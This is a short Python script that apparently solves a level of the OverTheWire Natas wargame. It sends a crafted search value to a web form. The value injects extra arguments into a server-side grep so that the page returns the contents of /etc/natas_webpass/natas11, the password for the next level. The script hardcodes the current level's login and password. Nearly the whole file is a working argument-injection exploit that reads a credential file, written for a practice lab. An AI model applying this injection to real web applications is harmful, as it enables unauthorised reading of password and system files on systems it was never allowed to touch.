#!/usr/bin/env python
import requests
payload={'needle':'c /etc/natas_webpass/natas11 /#','submit':'Search'}

url="http://natas10.natas.labs.overthewire.org"
r=requests.post(url, data=payload, auth=('natas10','nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu'))


print r.text
